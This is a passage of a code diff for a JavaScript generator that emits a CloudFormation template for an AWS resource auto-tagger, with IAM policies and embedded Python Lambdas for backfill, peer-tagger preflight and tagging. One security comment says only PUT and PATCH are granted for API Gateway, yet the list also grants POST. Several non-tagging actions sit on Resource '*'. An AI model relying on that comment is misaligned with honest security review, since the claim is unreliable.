+            'aws.kinesisvideo','aws.dsql','aws.vpc-lattice','aws.bedrock-agentcore',
+            'aws.payment-cryptography','aws.networkmanager','aws.workspaces-instances',
+            'aws.dax','aws.drs','aws.deadline','aws.iot',
+            'aws.wafv2','aws.codedeploy'
+        ];
+
+        const TAGGING_PERMISSIONS = [
+            // Universal tagging
+            'tag:TagResources','tag:GetResources',
+            // Compute
+            'ec2:CreateTags','autoscaling:CreateOrUpdateTags','ecs:TagResource','eks:TagResource',
+            'lambda:TagResource',
+            'elasticbeanstalk:AddTags','elasticmapreduce:AddTags','emr-serverless:TagResource',
+            // Storage
+            's3:PutBucketTagging','s3:GetBucketTagging','elasticfilesystem:TagResource','fsx:TagResource',
+            'ecr:TagResource','backup:TagResource',
+            // AWS Batch (§1.27): job queues, compute environments, job definitions.
+            // RGTA-dispatched; batch:TagResource required per service-auth matrix.
+            'batch:TagResource',
+            // Database
+            'rds:AddTagsToResource','dynamodb:TagResource','elasticache:AddTagsToResource',
+            'memorydb:TagResource','redshift:CreateTags','redshift-serverless:TagResource',
+            'es:AddTags','kafka:TagResource','dms:AddTagsToResource','cassandra:TagResource','cassandra:Alter',
+            'mq:CreateTags',
+            // Networking
+            'elasticloadbalancing:AddTags','globalaccelerator:TagResource','cloudfront:TagResource',
+            'route53:ChangeTagsForResource','network-firewall:TagResource','directconnect:TagResource',
+            'appmesh:TagResource',
+            // Analytics
+            'kinesis:AddTagsToStream','firehose:TagDeliveryStream','kinesisanalytics:TagResource',
+            'glue:TagResource','glue:GetDatabase','databrew:TagResource',
+            'athena:TagResource',
+            // Integration
+            'sns:TagResource','sqs:TagQueue','states:TagResource',
+            'appsync:TagResource','apigateway:TagResource',
+            // SECURITY NOTE: API Gateway v1 REST API tagging requires both PUT and PATCH.
+            // AWS maps tag_resource() to apigateway:PATCH internally (confirmed via AccessDenied testing).
+            // Precedent: MAP Taggr (AppSec-approved) grants all 5 API GW methods (GET/PUT/PATCH/DELETE/POST).
+            // We grant only PUT and PATCH — more conservative than the approved precedent.
+            'apigateway:PUT','apigateway:PATCH','apigateway:POST',
+            // Management & Monitoring
+            'logs:TagResource','cloudwatch:TagResource','ssm:AddTagsToResource',
+            'secretsmanager:TagResource',
+            'servicediscovery:TagResource',
+            'sns:Publish',
+            'sqs:DeleteMessage','sqs:GetQueueAttributes','sqs:ReceiveMessage','sqs:SendMessage',
+            // Security
+            'kms:TagResource','acm:AddTagsToCertificate',
+            'acm-pca:TagCertificateAuthority',
+            'cognito-idp:TagResource','cognito-identity:TagResource',
+            'securityhub:TagResource','wafv2:TagResource',
+            // Developer Tools
+            'codepipeline:TagResource','codedeploy:TagResource',
+            'cloud9:TagResource',
+            // CodeBuild: tags applied via UpdateProject; BatchGetProjects needed for tag resolution
+            'codebuild:UpdateProject','codebuild:BatchGetProjects',
+            // CloudFormation: tagging maps to UpdateStack internally; DescribeStacks is AWS's internal read for ARN validation.
+            // ListStacks is the peer-tagger detector at Lambda cold-start (§1.108, plan-PR #57).
+            'cloudformation:TagResource','cloudformation:UpdateStack','cloudformation:UpdateStackSet','cloudformation:DescribeStacks','cloudformation:ListStacks',
+            // Service Catalog: tagging routes through Update* actions
+            'servicecatalog:TagResource',
+            'servicecatalog:UpdatePortfolio','servicecatalog:UpdateProduct',
+            // Migration & Transfer
+            'transfer:TagResource','datasync:TagResource','storagegateway:AddTagsToResource',
+            // ML / AI
+            'sagemaker:AddTags','comprehend:TagResource',
+            'kendra:TagResource',
+            'bedrock:TagResource','braket:TagResource',
+            // IoT
+            'iot:TagResource','iotanalytics:TagResource','iotevents:TagResource',
+            'iotsitewise:TagResource',
+            // EventBridge (events:*) — distinct service from IoT Events (iotevents:*).
+            // Needed to tag newly-created Event rules / buses / schedules / connections.
+            'events:TagResource',
+            'kinesisvideo:TagStream','dsql:TagResource','vpc-lattice:TagResource',
+            'bedrock-agentcore:TagResource','payment-cryptography:TagResource',
+            'networkmanager:TagResource',
+            // Media
+            'mediaconvert:TagResource',
+            'medialive:CreateTags','mediapackage:TagResource',
+            // Other
+            'ram:TagResource','appstream:TagResource','workspaces:CreateTags',
+            'workspaces-web:TagResource','quicksight:TagResource','connect:TagResource',
+            'managedblockchain:TagResource',
+            'gamelift:TagResource','timestream:TagResource',
+            'healthlake:TagResource','omics:TagResource',
+            'resiliencehub:TagResource','deadline:TagResource','medical-imaging:TagResource',
+            'securityhub:TagResource','cassandra:Alter',
+            'dax:TagResource','drs:TagResource',
+            'kinesisvideo:TagStream',
+            // Tier 1 MAP services (PR #25): Keyspaces, Directory Service, CloudHSM v2.
+            // cassandra:TagResource already granted above under Database.
+            'ds:AddTagsToResource','cloudhsm:TagResource',
+            // IAM role tagging (iam:TagRole not covered by tag:TagResources)
+            'iam:TagRole'
+        ];
+
+        function generateMainTemplate(config) {
+            const mpe = config.mpeId;
+            const isMulti = config.deployMode === 'multi';
+            const scopeMode = config.scopeMode;
+            const vpcIds = JSON.stringify(config.scopedVpcIds);
+            const tagNonVpc = config.tagNonVpcServices;
+            const scopedAccountIdsJson = (config.useAccountScope && config.stacksetAccounts && config.stacksetAccounts.length > 0)
+                ? JSON.stringify(config.stacksetAccounts.map(a => a.id))
+                : '["ALL"]';
+            const scopedVpcIdsJson = (config.scopedVpcIds && config.scopedVpcIds.length > 0 && config.scopedVpcIds[0] !== 'NONE')
+                ? JSON.stringify(config.scopedVpcIds)
+                : '[]';
+            const alertEmail = config.alertEmail || '';
+
+            const backfillEventNamesList = [...new Set(ALL_EVENT_NAMES)].map(e => `            '${e}'`).join(',\n');
+
+            const backfillResources = config.includeBackfill ? `
+  BackfillRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: !Sub 'map-auto-tagger-backfill-${mpe}-\${AWS::Region}'
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: lambda.amazonaws.com
+            Action: sts:AssumeRole
+      Policies:
+        - PolicyName: backfill-policy
+          PolicyDocument:
+            Version: '2012-10-17'
+            Statement:
+              - Sid: BackfillCloudTrail
+                Effect: Allow
+                Action: cloudtrail:LookupEvents
+                Resource: '*'
+              - Sid: BackfillSendToQueue
+                Effect: Allow
+                Action: sqs:SendMessage
+                Resource: !GetAtt EventQueue.Arn
+              - Sid: BackfillLogging
+                Effect: Allow
+                Action:
+                  - logs:CreateLogGroup
+                  - logs:CreateLogStream
+                  - logs:PutLogEvents
+                Resource: !Sub 'arn:aws:logs:\${AWS::Region}:\${AWS::AccountId}:*'
+
+  BackfillFunction:
+    Type: AWS::Lambda::Function
+    Properties:
+      FunctionName: map-auto-tagger-backfill-${mpe}
+      Runtime: python3.12
+      Handler: index.handler
+      Role: !GetAtt BackfillRole.Arn
+      Timeout: 900
+      MemorySize: 256
+      Environment:
+        Variables:
+          EVENT_QUEUE_URL: !Ref EventQueue
+          AGREEMENT_START_DATE: '${config.agreementDate}'
+      Code:
+        ZipFile: |
+          import json, os, boto3, time
+          from datetime import datetime, timezone
+          from concurrent.futures import ThreadPoolExecutor, as_completed
+          from urllib.request import urlopen, Request
+
+          sqs_client = boto3.client('sqs')
+          cloudtrail_client = boto3.client('cloudtrail')
+
+          EVENT_QUEUE_URL = os.environ['EVENT_QUEUE_URL']
+          AGREEMENT_START_DATE = os.environ['AGREEMENT_START_DATE']
+
+          EVENT_NAMES = [
+${backfillEventNamesList}
+          ]
+
+          def respond(event, context, status, reason=''):
+              body = json.dumps({
+                  'Status': status,
+                  'Reason': reason or 'See CloudWatch logs',
+                  'PhysicalResourceId': context.log_stream_name,
+                  'StackId': event['StackId'],
+                  'RequestId': event['RequestId'],
+                  'LogicalResourceId': event['LogicalResourceId']
+              })
+              req = Request(event['ResponseURL'], data=body.encode(), method='PUT')
+              req.add_header('Content-Type', '')
+              req.add_header('Content-Length', str(len(body)))
+              urlopen(req)
+
+          def lookup_events(event_name, start_time):
+              results = []
+              lookup_error = None
+              kwargs = {
+                  'LookupAttributes': [{'AttributeKey': 'EventName', 'AttributeValue': event_name}],
+                  'StartTime': start_time,
+                  'MaxResults': 50
+              }
+              throttle_retry = 0
+              while True:
+                  try:
+                      resp = cloudtrail_client.lookup_events(**kwargs)
+                      throttle_retry = 0
+                      for ev in resp.get('Events', []):
+                          ct = json.loads(ev['CloudTrailEvent'])
+                          if ct.get('errorCode') or ct.get('errorMessage'):
+                              continue
+                          results.append(ct)
+                      next_token = resp.get('NextToken')
+                      if next_token:
+                          kwargs['NextToken'] = next_token
+                      else:
+                          break
+                  except Exception as e:
+                      err_str = str(e)
+                      # CloudTrail normally throws 'ThrottlingException' (with 'ing'),
+                      # but the variant 'ThrottledException' (with 'ed') has been observed
+                      # in some paths — PR #17 class. Match both for defensive symmetry.
+                      if ('ThrottlingException' in err_str or 'ThrottledException' in err_str or 'Rate exceeded' in err_str) and throttle_retry < 4:
+                          throttle_retry += 1
+                          time.sleep((2 ** throttle_retry) * 0.5)
+                          continue
+                      print(f"LookupEvents error for {event_name}: {e}")
+                      lookup_error = err_str
+                      break
+              return (results, lookup_error)
+
+          def handler(event, context):
+              # Handle CloudFormation Custom Resource
+              request_type = event.get('RequestType', '')
+              if request_type == 'Delete':
+                  respond(event, context, 'SUCCESS', 'Nothing to delete')
+                  return
+
+              try:
+                  # Read scope from Custom Resource properties (updated on each stack update)
+                  resource_props = event.get('ResourceProperties', {})
+                  scoped_accounts = json.loads(resource_props.get('ScopedAccounts', '["ALL"]'))
+
+                  # Account scope pre-check
+                  local_account = boto3.client('sts').get_caller_identity()['Account']
+                  if scoped_accounts != ['ALL'] and local_account not in scoped_accounts:
+                      print(f"Backfill: account {local_account} not in scope {scoped_accounts}, skipping.")
+                      respond(event, context, 'SUCCESS', 'Account not in scope')
+                      return
+
+                  try:
+                      start_time = datetime.strptime(AGREEMENT_START_DATE, '%Y-%m-%d').replace(tzinfo=timezone.utc)
+                  except ValueError:
+                      print(f"Backfill: invalid AGREEMENT_START_DATE '{AGREEMENT_START_DATE}', cannot run backfill.")
+                      respond(event, context, 'SUCCESS', f'Invalid agreement start date: {AGREEMENT_START_DATE}')
+                      return
+                  print(f"Backfill: querying CloudTrail from {AGREEMENT_START_DATE} for {len(EVENT_NAMES)} event types")
+
+                  all_events = []
+                  lookup_errors = 0
+                  with ThreadPoolExecutor(max_workers=3) as executor:
+                      futures = {executor.submit(lookup_events, name, start_time): name for name in EVENT_NAMES}
+                      for future in as_completed(futures):
+                          events, err = future.result()
+                          all_events.extend(events)
+                          if err is not None:
+                              lookup_errors += 1
+
+                  print(f"Backfill: found {len(all_events)} creation events ({lookup_errors} event types failed LookupEvents)")
+
+                  sent = 0
+                  errors = 0
+                  for ct_event in all_events:
+                      eb_event = {
+                          'version': '0',
+                          'source': f"aws.{ct_event.get('eventSource','').split('.')[0]}",
+                          'detail-type': 'AWS API Call via CloudTrail',
+                          'detail': ct_event
+                      }
+                      try:
+                          # Route backfill events through the same SQS pipeline as live events.
+                          # Single code path -- same Lambda, same retry behavior, same DLQ.
+                          sqs_client.send_message(
+                              QueueUrl=EVENT_QUEUE_URL,
+                              MessageBody=json.dumps(eb_event)
+                          )
+                          sent += 1
+                      except Exception as e:
+                          print(f"SendMessage error for {ct_event.get('eventName','?')}: {e}")
+                          errors += 1
+
+                  # Report SUCCESS to unblock stack create, but surface real counts in the
+                  # Reason so operators reading CFN events can tell whether backfill hit
+                  # LookupEvents errors / SendMessage errors. Prior behavior always said
+                  # "Backfill: N sent, 0 errors" regardless, masking LookupEvents failures.
+                  print(f"Backfill complete: {sent} events sent to EventQueue, {errors} send errors, {lookup_errors} lookup errors")
+                  reason = f'Backfill: {sent} sent, {errors} send errors, {lookup_errors}/{len(EVENT_NAMES)} event types failed lookup'
+                  respond(event, context, 'SUCCESS', reason)
+              except Exception as e:
+                  # Top-level exception — backfill could not run at all (permissions,
+                  # SSM read, date parse, etc). Report SUCCESS with error detail in Reason
+                  # so the stack still succeeds (backfill is best-effort; live tagging is
+                  # unaffected) but the failure is visible in CFN event history.
+                  import traceback
+                  print(traceback.format_exc())
+                  respond(event, context, 'SUCCESS', f'Backfill error (non-fatal): {str(e)[:300]}')
+
+  BackfillTrigger:
+    Type: Custom::Backfill
+    DependsOn: [AutoTaggerFunction, AutoTagEventRule, EventQueue, EventQueueMapping]
+    Properties:
+      ServiceToken: !GetAtt BackfillFunction.Arn
+      ScopedAccounts: '${scopedAccountIdsJson}'
+` : '';
+
+
+            const permissionsList = TAGGING_PERMISSIONS.map(p => `                  - ${p}`).join('\n');
+
+            const eventNamesList = [...new Set(ALL_EVENT_NAMES)].map(e => `            - ${e}`).join('\n');
+            const sourcesList = ALL_SOURCES.map(s => `          - ${s}`).join('\n');
+
+            // TEMPLATE_VERSION is the module-level constant declared near the top of this script.
+            return `# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
+# SPDX-License-Identifier: MIT-0
+AWSTemplateFormatVersion: '2010-09-09'
+Description: >
+  MAP 2.0 Auto-Tagger ${TEMPLATE_VERSION} for ${config.customerName || 'Customer'} (MPE: ${mpe}).
+  Auto-tags 140+ AWS resource types within typically 60-90 seconds (up to 15 minutes during high-volume activity) of creation.
+  ${isMulti ? 'Deploy via StackSet to all accounts in org.' : 'Deploy in the migration account.'}
+  ${TEMPLATE_VERSION}: Resilient event pipeline - EventBridge now routes via SQS queue (14-day retention,
+  vs EventBridge 24h limit); removed ReservedConcurrentExecutions to prevent deployment
+  failures on accounts near Lambda concurrency quota; added DLQ alarm with SNS email
+  notification; Lambda publishes specific failed resource ARN to SNS on tagging failure.
+
+Parameters:
+  MpeId:
+    Type: String
+    Default: '${mpe}'
+    AllowedPattern: ^mig[a-zA-Z0-9]+$
+    MaxLength: 20
+    Description: MAP 2.0 MPE ID
+  AgreementStartDate:
+    Type: String
+    Default: '${config.agreementDate}'
+    AllowedPattern: ^(19|20)\\d{2}-(0[1-9]|1[0-2])-(0[1-9]|[12]\\d|3[01])$
+    Description: MAP agreement start date (YYYY-MM-DD)
+  AgreementEndDate:
+    Type: String
+    Default: '${config.agreementEndDate}'
+    AllowedPattern: ^(19|20)\\d{2}-(0[1-9]|1[0-2])-(0[1-9]|[12]\\d|3[01])$
+    Description: MAP agreement end date (YYYY-MM-DD)
+  ScopeMode:
+    Type: String
+    Default: '${scopeMode}'
+    AllowedValues: [account, vpc]
+  AlertEmail:
+    Type: String
+    Default: '${alertEmail}'
+    Description: Customer ops email for tagging failure alerts (leave empty to disable)
+
+Conditions:
+  HasAlertEmail: !Not [!Equals [!Ref AlertEmail, '']]
+
+Resources:
+
+  # Template version pinned at deploy time — read by ops, upgrade.sh, and
+  # external tooling. No outbound network calls; discovered locally via SSM.
+  MapVersion:
+    Type: AWS::SSM::Parameter
+    Properties:
+      Name: /auto-map-tagger/${mpe}/version
+      Type: String
+      Description: MAP 2.0 Auto-Tagger template version pinned at deploy time
+      Value: ${TEMPLATE_VERSION}
+
+  MapConfig:
+    Type: AWS::SSM::Parameter
+    Properties:
+      Name: /auto-map-tagger/${mpe}/config
+      # Tier: Intelligent-Tiering — see §1.60 comment in map2-auto-tagger-optimized.yaml.
+      # Customers with ~240+ accounts in scoped_account_ids produce a Value > 4KB; AWS
+      # auto-upgrades to Advanced tier ($0.05/parameter/month) instead of failing stack
+      # create with ParameterMaxSizeExceeded. Zero cost impact below the threshold.
+      Tier: Intelligent-Tiering
+      # SECURITY NOTE: Type: String is intentional. The stored values (MPE ID, agreement
+      # dates, account/VPC scope lists) are non-sensitive operational configuration — not
+      # credentials, secrets, or PII. SecureString would require KMS decrypt permissions
+      # on every Lambda invocation with no security benefit for this data classification.
+      Type: String
+      Value: |
+          {
+            "mpe_id": "${mpe}",
+            "agreement_start_date": "${config.agreementDate}",
+            "agreement_end_date": "${config.agreementEndDate}",
+            "scope_mode": "${scopeMode}",
+            "scoped_account_ids": ${scopedAccountIdsJson},
+            "scoped_vpc_ids": ${scopedVpcIdsJson},
+            "tag_non_vpc_services": ${tagNonVpc}
+          }
+
+  AutoTaggerRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: !Sub 'map-auto-tagger-role-${mpe}-\${AWS::Region}'
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: lambda.amazonaws.com
+            Action: sts:AssumeRole
+      Policies:
+        - PolicyName: map-auto-tagger-policy
+          PolicyDocument:
+            Version: '2012-10-17'
+            Statement:
+              # SECURITY NOTE: Resource: '*' is required for tagging actions.
+              # AWS Tag Editor API (tag:TagResources) does not support resource-level
+              # permissions -- it must be scoped to '*'. This is consistent with
+              # AWS-managed tagging solutions (e.g., AWS Tag Editor console, MAP Taggr).
+              # The Lambda only applies the map-migrated tag and has no create/delete/update
+              # permissions outside of tagging. IAM Access Analyzer: 0 findings.
+              - Sid: ServiceTagging
+                Effect: Allow
+                Action:
+${permissionsList}
+                Resource: '*'
+              - Sid: MinimalReads
+                Effect: Allow
+                Action:
+                  - ec2:DescribeInstances
+                  - ec2:DescribeVolumes
+                  - sts:GetCallerIdentity
+                  - ssm:GetParameters
+                  - cloudformation:DescribeStacks
+                  - iam:TagRole
+                Resource: '*'
+              - Sid: SqsEventSource
+                Effect: Allow
+                Action:
+                  - sqs:ReceiveMessage
+                  - sqs:DeleteMessage
+                  - sqs:GetQueueAttributes
+                  - sqs:SendMessage
+                Resource:
+                  - !GetAtt EventQueue.Arn
+                  - !GetAtt EventDLQ.Arn
+              - Sid: AlertPublish
+                Effect: Allow
+                Action:
+                  - sns:Publish
+                Resource: !Ref AlertTopic
+              - Sid: EmitClassifierMetrics
+                Effect: Allow
+                Action:
+                  - cloudwatch:PutMetricData
+                Resource: '*'
+                Condition:
+                  StringEquals:
+                    cloudwatch:namespace: MapAutoTagger
+              - Sid: ReadConfig
+                Effect: Allow
+                Action: ssm:GetParameter
+                Resource: !Sub arn:aws:ssm:\${AWS::Region}:\${AWS::AccountId}:parameter/auto-map-tagger/${mpe}/config
+              # Peer-tagger detection at cold start. Lists map-auto-tagger-mig*
+              # stacks in this account/region to surface concurrent taggers
+              # (§1.108 Phase 16). ListStacks has no resource-level IAM per
+              # AWS IAM Service Authorization Reference; scope is implicitly
+              # the caller's account. Read-only.
+              - Sid: PeerTaggerDetect
+                Effect: Allow
+                Action:
+                  - cloudformation:ListStacks
+                Resource: '*'
+              - Sid: Logging
+                Effect: Allow
+                Action:
+                  - logs:CreateLogGroup
+                  - logs:CreateLogStream
+                  - logs:PutLogEvents
+                Resource: !Sub arn:aws:logs:\${AWS::Region}:\${AWS::AccountId}:*
+
+  # ── Preflight: peer-tagger scope-overlap guard at stack-instance creation ──
+  # Runs BEFORE AutoTaggerFunction is created. If another map-auto-tagger-mig*
+  # stack exists in this account+region with an overlapping scope, fail the
+  # Custom Resource → CFN rolls back this stack instance → no AutoTaggerFunction
+  # is ever provisioned. Closes the §1.108 temporal race (StackSet AutoDeployment
+  # into newly-joined OU accounts, and member-account deploys where the member
+  # already has a peer stack). Fail-open on any internal error.
+  PreflightRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: !Sub 'map-preflight-role-${mpe}-\${AWS::Region}'
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: lambda.amazonaws.com
+            Action: sts:AssumeRole
+      Policies:
+        - PolicyName: map-auto-tagger-preflight-policy
+          PolicyDocument:
+            Version: '2012-10-17'
+            Statement:
+              - Sid: ListOwnStacks
+                Effect: Allow
+                Action:
+                  - cloudformation:ListStacks
+                Resource: '*'
+              - Sid: ReadPeerConfigs
+                Effect: Allow
+                Action:
+                  - ssm:GetParameter
+                Resource: !Sub arn:aws:ssm:\${AWS::Region}:\${AWS::AccountId}:parameter/auto-map-tagger/*/config
+              - Sid: Logging
+                Effect: Allow
+                Action:
+                  - logs:CreateLogGroup
+                  - logs:CreateLogStream
+                  - logs:PutLogEvents
+                Resource: !Sub arn:aws:logs:\${AWS::Region}:\${AWS::AccountId}:*
+
+  PreflightFunction:
+    Type: AWS::Lambda::Function
+    Properties:
+      FunctionName: map-auto-tagger-preflight-${mpe}
+      Runtime: python3.12
+      Handler: index.handler
+      Role: !GetAtt PreflightRole.Arn
+      Timeout: 60
+      MemorySize: 256
+      Code:
+        ZipFile: |
+          import json, os, boto3
+          from urllib.request import urlopen, Request
+
+          def respond(event, context, status, reason=''):
+              body = json.dumps({
+                  'Status': status,
+                  'Reason': reason or 'See CloudWatch logs',
+                  'PhysicalResourceId': context.log_stream_name,
+                  'StackId': event['StackId'],
+                  'RequestId': event['RequestId'],
+                  'LogicalResourceId': event['LogicalResourceId'],
+              })
+              req = Request(event['ResponseURL'], data=body.encode(), method='PUT')
+              req.add_header('Content-Type', '')
+              req.add_header('Content-Length', str(len(body)))
+              urlopen(req)
+
+          def scope_overlap(new_mode, new_accts, new_vpcs, peer_mode, peer_accts, peer_vpcs, this_account):
+              new_accts = set(new_accts or [])
+              peer_accts = set(peer_accts or [])
+              new_vpcs = set(new_vpcs or [])
+              peer_vpcs = set(peer_vpcs or [])
+              if new_mode == 'account' and peer_mode == 'account':
+                  if 'ALL' in peer_accts:
+                      return f'peer scope=account/ALL dominates {this_account}'
+                  if 'ALL' in new_accts:
+                      return f'our scope=account/ALL dominates peer in {this_account}'
+                  if this_account in peer_accts and (this_account in new_accts or 'ALL' in new_accts):
+                      return f'peer scope includes {this_account}'
+                  return ''
+              if new_mode == 'account' and peer_mode == 'vpc':
+                  if 'ALL' in new_accts or this_account in new_accts:
+                      return 'our account-mode dominates peer VPC-scope on shared VPCs'
+                  return ''
+              if new_mode == 'vpc' and peer_mode == 'account':
+                  if 'ALL' in peer_accts or this_account in peer_accts:
+                      return f'peer account-mode dominates our VPC-scope'
+                  return ''
+              overlap = new_vpcs & peer_vpcs
+              if overlap:
+                  return f'shared VPC(s): {sorted(overlap)}'
+              return ''
+
+          def check_peers(props, account, region):
+              own_mpe = props['MpeId']
+              new_mode = props.get('ScopeMode', 'account')
+              new_accts = props.get('ScopedAccountIds') or ['ALL']
+              if isinstance(new_accts, str):
+                  new_accts = [s.strip() for s in new_accts.split(',') if s.strip()]
+              new_vpcs = props.get('ScopedVpcIds') or []
+              if isinstance(new_vpcs, str):
+                  new_vpcs = [s.strip() for s in new_vpcs.split(',') if s.strip() and s.strip() != 'NONE']
+              cfn = boto3.client('cloudformation')
+              ssm = boto3.client('ssm')
+              conflicts = []
+              active = ['CREATE_COMPLETE', 'UPDATE_COMPLETE', 'UPDATE_ROLLBACK_COMPLETE']
+              for page in cfn.get_paginator('list_stacks').paginate(StackStatusFilter=active):
+                  for s in page.get('StackSummaries', []):
+                      name = s.get('StackName', '')
+                      if name.startswith('StackSet-map-auto-tagger-mig'):
+                          peer_mpe = name[len('StackSet-map-auto-tagger-'):]
+                      elif name.startswith('map-auto-tagger-mig'):
+                          peer_mpe = name[len('map-auto-tagger-'):]
+                      else:
+                          continue
+                      # StackSet instance stack names have a UUID suffix: {mpe}-{uuid}
+                      import re
+                      peer_mpe = re.sub(r'-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', '', peer_mpe)
+                      if peer_mpe == own_mpe:
+                          continue
+                      try:
+                          p = ssm.get_parameter(Name=f'/auto-map-tagger/{peer_mpe}/config')
+                          cfg = json.loads(p['Parameter']['Value'])
+                      except Exception as e:
+                          conflicts.append(f'peer {name} config unreadable ({e.__class__.__name__})')
+                          continue
+                      peer_mode = cfg.get('scope_mode', 'account')
+                      peer_accts = cfg.get('scoped_account_ids') or ['ALL']
+                      peer_vpcs = cfg.get('scoped_vpc_ids') or []
+                      reason = scope_overlap(
+                          new_mode, new_accts, new_vpcs,
+                          peer_mode, peer_accts, peer_vpcs,
+                          account,
+                      )
+                      if reason:
+                          conflicts.append(f'{name} (MPE {peer_mpe}): {reason}')
+              return conflicts
+
+          def handler(event, context):
+              try:
+                  rt = event.get('RequestType', '')
+                  if rt in ('Update', 'Delete'):
+                      return respond(event, context, 'SUCCESS', f'{rt}: no-op')
+                  # Detect upgrade: CFN sends Create for a new resource, but if a
+                  # tagger stack with this MpeId already exists then the peer-Lambda
+                  # is already live — this is a template upgrade, not a fresh deploy.
+                  # Uses ListStacks (already in PreflightRole IAM) instead of
+                  # DescribeStacks to avoid needing an extra IAM grant.
+                  props = event.get('ResourceProperties', {})
+                  own_mpe = props.get('MpeId', '')
+                  if own_mpe:
+                      own_stack = f'map-auto-tagger-{own_mpe}'
+                      cfn_client = boto3.client('cloudformation')
+                      active = ['CREATE_COMPLETE', 'UPDATE_COMPLETE', 'UPDATE_ROLLBACK_COMPLETE', 'UPDATE_IN_PROGRESS']
+                      for page in cfn_client.get_paginator('list_stacks').paginate(StackStatusFilter=active):
+                          for s in page.get('StackSummaries', []):
+                              if s['StackName'] == own_stack:
+                                  return respond(event, context, 'SUCCESS',
+                                                 f'Upgrade detected ({own_stack} exists): skip preflight')
+                      # stack not found — genuine first deploy, proceed to check
+                  account = context.invoked_function_arn.split(':')[4]
+                  region = os.environ.get('AWS_REGION', '')
+                  conflicts = check_peers(props, account, region)
+                  if conflicts:
+                      reason = (
+                          'Peer tagger scope conflict — stack creation blocked '
+                          f'to prevent §1.108 cross-Lambda contamination. '
+                          f'Conflicts: {"; ".join(conflicts)[:800]}. '
+                          'Resolve via: delete the peer stack, OR narrow this '
+                          'deploy\\'s scope to not overlap, OR narrow the peer\\'s scope.'
+                      )
+                      print(f'PreflightConflict: {reason}')
+                      return respond(event, context, 'FAILED', reason)
+                  return respond(event, context, 'SUCCESS', 'No peer tagger scope conflict')
+              except Exception as e:
+                  import traceback
+                  print(traceback.format_exc())
+                  return respond(event, context, 'SUCCESS', f'Preflight fail-open ({e.__class__.__name__}): {str(e)[:200]}')
+
+  PreflightTrigger:
+    Type: Custom::PeerTaggerPreflight
+    # No explicit DependsOn — the ServiceToken reference below already
+    # creates the implicit dependency on PreflightFunction. Adding an
+    # explicit DependsOn produces cfn-lint W3005 (redundant dependency).
+    Properties:
+      ServiceToken: !GetAtt PreflightFunction.Arn
+      MpeId: !Ref MpeId
+      ScopeMode: '${scopeMode}'
+      ScopedAccountIds: '${scopedAccountIdsJson}'
+      ScopedVpcIds: '${scopedVpcIdsJson}'
+
+  AutoTaggerLogGroup:
+    Type: AWS::Logs::LogGroup
+    DeletionPolicy: Delete
+    UpdateReplacePolicy: Delete
+    Properties:
+      LogGroupName: /aws/lambda/map-auto-tagger-${mpe}
+      RetentionInDays: 14
+
+  AutoTaggerFunction:
+    Type: AWS::Lambda::Function
+    DependsOn:
+      - AutoTaggerLogGroup
+      - PreflightTrigger  # Custom Resource must return SUCCESS before tagger is provisioned
+    Properties:
+      FunctionName: map-auto-tagger-${mpe}
+      Runtime: python3.12
+      Handler: index.handler
+      Role: !GetAtt AutoTaggerRole.Arn
+      Timeout: 60
+      MemorySize: 256
+      # No ReservedConcurrentExecutions -- using SQS buffering. Throttling delays
+      # processing but never drops events. Messages retained in SQS for up to 14 days.
+      Environment:
+        Variables:
+          CONFIG_PARAM: /auto-map-tagger/${mpe}/config
+          ALERT_TOPIC_ARN: !Ref AlertTopic
+      Code:
+        ZipFile: |
+          import json, os, boto3, re, time, random
+          from datetime import datetime, timezone
+          from botocore.exceptions import ClientError
+
+          # Template version pinned at deploy time. Surfaced in CloudWatch Logs on
+          # every cold start so ops can trace which version processed an event
+          # without reading the CFN stack or SSM parameter.
+          TEMPLATE_VERSION = '${TEMPLATE_VERSION}'
+          print(f'auto-map-tagger {TEMPLATE_VERSION} cold start')
+
+          ssm = boto3.client('ssm')
+          ec2 = boto3.client('ec2')
+          tagging = boto3.client('resourcegroupstaggingapi')
+          _config = None
+          _config_ts = 0.0
+          # Warm containers live ~15 min; an MPE rotation via SSM wouldn't be
+          # seen until the container recycled, silently misattributing credit.
+          # 60s TTL bounds the window without adding meaningful SSM load.
+          _CONFIG_TTL_SECONDS = 60
+
+          # Peer-tagger detection (§1.108, partial). Runs once at cold-start and
+          # logs a WARN + emits a CloudWatch metric (MapAutoTagger /
+          # PeerTaggerDetected, dimensions MpeId + PeerMpeId) when another
+          # map-auto-tagger-mig* stack is found in this account/region.
+          #
+          # Why this exists: the configurator's Class-2 scope-intersection
+          # preflight (PR #24 + PR #38 Option D) hard-fails on overlap at
+          # deploy.sh run-time, but StackSet-engine provisioning (AutoDeployment:
+          # True or stack-instance-creation into new OU accounts) bypasses
+          # deploy.sh entirely. Phase 16 Test 5 confirmed: linked3 had
+          # migbfltest1 (own deploy, passed preflight) + migph2stack01 (arrived
+          # via StackSet AutoDeployment, no preflight) — 0/50 resources tagged
+          # with migbfltest1. This detector doesn't prevent the contamination;
+          # it surfaces it so customers find out from a CloudWatch alarm rather
+          # than during a MAP finance audit.
+          #
+          # Architectural fix (deterministic multi-Lambda routing) is tracked as
+          # plan-PR #59 / Wave 28, blocked on design decision with Jin.
+          def _detect_peer_taggers():
+              try:
+                  own_mpe = None
+                  cfg_param = os.environ.get('CONFIG_PARAM', '')
+                  # CONFIG_PARAM is /auto-map-tagger/<mpe>/config
+                  m = re.match(r'^/auto-map-tagger/([^/]+)/config$', cfg_param)
+                  if m:
+                      own_mpe = m.group(1)
+                  if not own_mpe:
+                      print('PeerTaggerDetect: could not derive own MpeId from CONFIG_PARAM; skipping')
+                      return
+                  cfn = boto3.client('cloudformation')
+                  paginator = cfn.get_paginator('list_stacks')
+                  peer_mpes = []
+                  active = ['CREATE_COMPLETE', 'UPDATE_COMPLETE', 'UPDATE_ROLLBACK_COMPLETE']
+                  for page in paginator.paginate(StackStatusFilter=active):
+                      for s in page.get('StackSummaries', []):
